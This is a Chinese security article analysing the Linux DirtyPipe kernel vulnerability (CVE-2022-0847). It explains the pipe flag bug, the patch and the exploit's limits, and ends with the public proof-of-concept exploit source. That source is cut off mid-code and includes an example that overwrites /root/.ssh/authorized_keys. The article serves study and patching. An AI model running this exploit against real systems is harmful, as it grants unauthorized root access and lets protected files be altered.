---
title: DirtyPipe（CVE-2022-0847）漏洞分析
url: https://www.secpulse.com/archives/194277.html
source: 安全脉搏
date: 2022-12-30
fetch_date: 2025-10-04T02:43:53.594861
---

# DirtyPipe（CVE-2022-0847）漏洞分析

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# DirtyPipe（CVE-2022-0847）漏洞分析

[漏洞](https://www.secpulse.com/archives/category/vul)

[蚁景网安实验室](https://www.secpulse.com/newpage/author?author_id=37244)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng2.png)

2022-12-29

11,197

# 前言

`CVE-2022-0847  DirtyPipe`脏管道漏洞是`Linux`内核中的一个漏洞，该漏洞允许写只读文件，从而导致提权。

# 调试环境

* • `ubuntu 20.04`
* • `Linux-5.16.10`
* • `qemu-system-x86_64 4.2.1`

# 漏洞验证

首先创建一个只读文件`foo.txt`，并且正常情况下是无法修改该可读文件，但是利用了`DirtyPipe`漏洞后发现可以将字符`aaaa`写入到只读文件中

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194277-1672284958.png)

# 漏洞分析

以`poc`作为切入点，分析漏洞成因

首先`poc`创建了一个管道，管道缓冲区的默认大小为4096，并且拥有16个缓存区，因此再创建管道之后，`poc`首先要做的是将这16个管道缓冲区填满。

```
...
    if (pipe(p)) abort();

    const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    static char buffer[4096];

    for (unsigned r = pipe_size; r > 0😉 {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        write(p[1], buffer, n);
        r -= n;
    }
...
```

在进行管道写的操作时，内核是采用`pipe_write`函数进行操作，这里截取了关键部分，在进行管道写的时候会判断通过函数`is_packetized`去判断是否为目录属性，如果不是则将缓冲区的标志位设置为`PIPE_BUF_FLAG_CAN_MERGE`，这个标志位非常关键，是导致漏洞成因，因此`poc`为了使16个管道缓冲区都设置`PIPE_BUF_FLAG_CAN_MERGE`标志位，因此选择循环16次， 并且将每个管道缓冲区都写满。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194277-1672284959.png)

随着`poc`将管道内的数据全部读出，为了清空管道缓冲区，在进行管道读的过程中，内核采用的是`pipe_read`函数，在整个管道读的过程中是不会修改管道的标志位的，因此`PIPE_BUF_FLAG_CAN_MEGE`标志位依旧存在

```
...
for (unsigned r = pipe_size; r > 0😉 {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        read(p[0], buffer, n);
        r -= n;
    }
...
```

紧接着是触发漏洞的关键函数，`splice`函数，用于移动数据，此时`fd`指向我们想读取的文件，对应上述的`foo.txt`只读文件，p[1]指向的是我们的管道符。

```
...
ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
...
```

在调用`splice`函数时，内核在某个阶段会调用`copy_page_to_iter`函数，可以看到当管道满了之后就没办法通过`splice`函数往管道内继续输入数据，那么`splice`函数就无法正常执行了，因此需要清空管道内的数据。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194277-1672284960.png)

后面则到达了漏洞发生的代码，由于我们使用`splice`函数进行数据的移动，在内核中不是选择将数据直接从文件中拷贝到管道中，而是将文件所在的物理页直接赋值给管道缓冲区所对应的页面。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194277-1672284962.png)

这里记录一下物理页的地址

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194277-1672284963.png)

最后就是再次调用管道写的操作，但是这里实际会写入只读文件内部

```
...
nbytes = write(p[1], data, data_size);
...
```

由于已经通过`splice`函数移动数据到管道缓冲区古内部了，因此管道不为空会进入到`455`行的内部处理逻辑

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194277-1672284964.png)

最终到达了往只读文件写入的操作，这里看到了`PIPE_BUF_FLAG_CAN_MERGE`这个标志位的作用，该标志位就是会将数据合并，使得后续管道写的操作会继续向之前的管道缓冲区对应的物理页面继续写入，写入的操作是通过`copy_page_from_iter(buf->page,offset,chars,from)`函数进行完成的，该函数实际就是将`from`对应的数据写入到`buf->page`中

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194277-1672284966.png)

可以看到`buf->page`与`page`地址是完全一样的，这就导致我们将数据写入修改到`foo.txt`文件中

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194277-1672284968.png)

# 补丁

补丁页比较简单，在获取物理页的同时把管道缓冲区的标志位清空，就不会导致后面对管道进行写操作的时候进入合并数据流的流程

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-194277-16722849681.png "null")

image-20221227164411448

# 总结

`DirtyPipe`**攻击流程**

* • 将所有管道缓冲区都设置`PIPE_BUF_FLAG_CAN_MERGE`标志位
* • 清空管道缓冲区
* • 使用`splice`函数获取文件所对应的物理页
* • 使用`pipe_write`函数对拥有`PIPE_BUF_FLAG_CAN_MERGE`标志位的处理，对获得文件对应的物理页进行写入操作，从而达到对只读文件写入的操作

`DirtyPipe`**利用的限制**

* • 对文件有读权限，因为`splice`函数会首先判断对文件是否有可读权限，若无则无法正常执行
* • 由于`DirtyPipe`是对文件对应的物理做覆写操作，因此不能修改超过文件本身大小的数据，以及文件的第一个字节无法被修改（因为`splice`函数需要移动至少一字节数据）
* • 由于`DirtyPipe`是对物理页进行修改，因此修改数据大小也不能超过一页

# 完整的poc

```
/* SPDX-License-Identifier: GPL-2.0 */
/*
 * Copyright 2022 CM4all GmbH / IONOS SE
 *
 * author: Max Kellermann <max.kellermann@ionos.com>
 *
 * Proof-of-concept exploit for the Dirty Pipe
 * vulnerability (CVE-2022-0847) caused by an uninitialized
 * "pipe_buffer.flags" variable.  It demonstrates how to overwrite any
 * file contents in the page cache, even if the file is not permitted
 * to be written, immutable or on a read-only mount.
 *
 * This exploit requires Linux 5.8 or later; the code path was made
 * reachable by commit f6dd975583bd ("pipe: merge
 * anon_pipe_buf*_ops").  The commit did not introduce the bug, it was
 * there before, it just provided an easy way to exploit it.
 *
 * There are two major limitations of this exploit: the offset cannot
 * be on a page boundary (it needs to write one byte before the offset
 * to add a reference to this page to the pipe), and the write cannot
 * cross a page boundary.
 *
 * Example: ./write_anything /root/.ssh/authorized_keys 1 $'nssh-ed25519 AAA......n'
 *
 * Further explanation: https://dirtypipe.cm4all.com/
 */

#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

/**
 * Create a pipe where all "bufs" on the pipe_inode_info ring have the
 * PIPE_BUF_FLAG_CAN_MERGE flag set.
 */
static void prepare_pipe(int p[2])
{
    if (pipe(p)) abort();

    const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    static char buffer[4096];

    /* fill the pipe completely; each pipe_buffer will now have
       the PIPE_BUF_FLAG_CAN_MERGE flag */
    for (unsigned r = pipe_size; r > 0😉 {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        write(p[1], buffer, n);
        r -= n;
    }

    /* drain the pipe, freeing all pipe_buffer instances (but
       leaving the flags initialized) */
    for (unsigned r = pipe_size; r > 0😉 {
        unsigned n = r > sizeof(buffer) ? sizeof(buf...